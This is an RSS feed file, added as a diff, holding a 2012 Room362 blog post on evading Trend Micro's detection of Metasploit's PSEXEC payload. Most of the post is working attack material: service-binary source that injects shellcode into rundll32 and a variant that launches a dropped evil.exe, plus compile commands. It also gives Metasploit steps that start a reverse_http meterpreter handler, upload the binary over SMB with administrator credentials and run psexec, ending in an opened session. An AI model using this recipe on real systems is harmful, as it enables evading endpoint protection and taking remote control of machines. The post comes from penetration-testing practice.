@@ -1,0 +1,203 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Trendmicro on Room362</title>
+    <link>http://room362.com/categories/trendmicro/</link>
+    <description>Recent content in Trendmicro on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Thu, 05 Jul 2012 03:44:59 +0000</lastBuildDate>
+    <atom:link href="http://room362.com/categories/trendmicro/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Bypassing Trend Micro&#39;s Service Protection</title>
+      <link>http://room362.com/post/2012/2012-07-05-bypassing-trend-micros-service-protection/</link>
+      <pubDate>Thu, 05 Jul 2012 03:44:59 +0000</pubDate>
+      
+      <guid>http://room362.com/post/2012/2012-07-05-bypassing-trend-micros-service-protection/</guid>
+      <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jabjorkhaug&#34;&gt;@jabjorkhaug&lt;/a&gt; posed the following question on Twitter today:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201207_trendmicro_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201207_trendmicro_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The service binary that is used as part of PSEXEC is located here:&lt;/p&gt;
+
+&lt;p&gt;MSF Directory/data/templates/src/pe/exe/service/service.c&lt;/p&gt;
+
+&lt;p&gt;The important part to look at starts at line 57:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#define WIN32_LEAN_AND_MEAN
+#include &amp;lt;windows.h&amp;gt;
+
+#define PAYLOAD_SIZE	8192
+
+char cServiceName[32] = &amp;quot;SERVICENAME&amp;quot;;
+
+char bPayload[PAYLOAD_SIZE] = &amp;quot;PAYLOAD:&amp;quot;;
+
+SERVICE_STATUS ss;
+
+SERVICE_STATUS_HANDLE hStatus = NULL;
+
+/*
+ *
+ */
+BOOL ServiceHandler( DWORD dwControl )
+{
+	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
+	{
+		ss.dwWin32ExitCode = 0;
+		ss.dwCurrentState  = SERVICE_STOPPED;
+	}
+	return SetServiceStatus( hStatus, &amp;amp;ss );
+}
+
+/*
+ *
+ */
+VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
+{
+	CONTEXT Context;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	LPVOID lpPayload = NULL;
+
+	ZeroMemory( &amp;amp;ss, sizeof(SERVICE_STATUS) );
+	ZeroMemory( &amp;amp;si, sizeof(STARTUPINFO) );
+	ZeroMemory( &amp;amp;pi, sizeof(PROCESS_INFORMATION) );
+
+	si.cb = sizeof(STARTUPINFO);
+
+	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
+
+	ss.dwCurrentState = SERVICE_START_PENDING;
+
+	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
+
+	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
+  
+	if ( hStatus )
+	{
+		ss.dwCurrentState = SERVICE_RUNNING;
+
+		SetServiceStatus( hStatus, &amp;amp;ss );
+
+		if( CreateProcess( NULL, &amp;quot;rundll32.exe&amp;quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )
+		{
+			Context.ContextFlags = CONTEXT_FULL;
+		  
+			GetThreadContext( pi.hThread, &amp;amp;Context );
+		  
+			lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+			if( lpPayload )
+			{
+				WriteProcessMemory( pi.hProcess, lpPayload, &amp;amp;bPayload, PAYLOAD_SIZE, NULL );
+#ifdef _WIN64
+				Context.Rip = (DWORD64)lpPayload;
+#else
+				Context.Eip = (DWORD)lpPayload;
+#endif
+				SetThreadContext( pi.hThread, &amp;amp;Context );
+			}
+
+			ResumeThread( pi.hThread );
+			
+			CloseHandle( pi.hThread );
+		  
+			CloseHandle( pi.hProcess );
+		}
+		
+		ServiceHandler( SERVICE_CONTROL_STOP );
+		
+		ExitProcess( 0 );
+	}
+}
+
+/*
+ *
+ */
+int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
+{
+	SERVICE_TABLE_ENTRY st[] = 
+    { 
+        { (LPSTR)&amp;amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;amp;ServiceMain }, 
+        { NULL, NULL } 
+    };
+	return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;amp;st );
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It&amp;rsquo;s injecting our payload into the service binary and tossing our payload into &amp;ldquo;rundll32.exe&amp;rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&amp;rsquo;t do any injection and just executes a binary. That removes the &amp;lsquo;injection&amp;rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.&lt;/p&gt;
+
+&lt;p&gt;To make this change you replace the above with just this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;if( CreateProcess( NULL, &amp;quot;C:\evil.exe&amp;quot;, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &amp;amp;si, &amp;amp;pi ) )
+{
+	CloseHandle( pi.hProcess );
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Compiling this on OSX using mingw is very easy and is very similar on Ubuntu if you have mingw installed:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;i386-mingw32-gcc -o service.exe service.c 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then just copy it to replace the current one:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;cp service.exe ../../../../template_x86_windows_svc.exe 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No other changes are needed. Only problem is, how do we get the &amp;ldquo;evil.exe&amp;rdquo; up onto the box for it to execute? That&amp;rsquo;s where the auxiliary module &amp;ldquo;auxiliary/admin/smb/upload_file&amp;rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, &lt;em&gt;remove the comments for it to work&lt;/em&gt;):&lt;/p&gt;
+
+&lt;p&gt;Start Multi Handler&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;use multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 172.16.195.1
+set LPORT 80
+set ExitOnSession false
+exploit -j -z
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Upload file to evil.exe on the C$ share (C$ is default for this module so no reason to set it)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;use auxiliary/admin/smb/upload_file
+set LPATH evil.exe
+set RPATH evil.exe
+set RHOST 172.16.195.155
+set SMBUser Administrator
+set SMBPass Password1234!
+run
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Execute PSEXEC using the new service binary that simply executes&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;use exploit/windows/smb/psexec
+set RHOST 172.16.195.155
+set SMBUser Administrator
+set SMBPass Password1234!
+set DisablePayloadHandler true
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 172.16.195.1
+set LPORT 80
+exploit -j -z
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The passwords could have just as easily been hashes, and the end result is:&lt;/p&gt;
+
+&lt;p&gt;Well I can&amp;rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; [*] Meterpreter session 2 opened (172.16.195.1:80 -&amp;gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;w00t!&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
